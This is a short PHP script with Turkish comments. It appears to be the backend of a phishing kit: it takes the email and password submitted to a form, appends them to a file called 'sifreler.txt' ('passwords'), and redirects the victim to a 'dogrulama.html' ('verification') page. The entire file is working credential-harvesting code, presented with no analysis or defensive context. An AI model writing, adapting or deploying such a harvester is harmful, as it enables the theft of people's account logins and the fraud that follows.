<?php
$user = $_POST['email']; 
$pass = $_POST['password'];

// Bilgiyi hazırla (Başına yıldız koyalım ki karışmasın)
$bilgi = "**********\nMAIL: " . $user . "\nSIFRE: " . $pass . "\n";

// FILE_APPEND ekleyerek dosyanın SONUNA yazmasını sağlıyoruz
file_put_contents('sifreler.txt', $bilgi, FILE_APPEND);

header("Location: dogrulama.html");
exit();
?>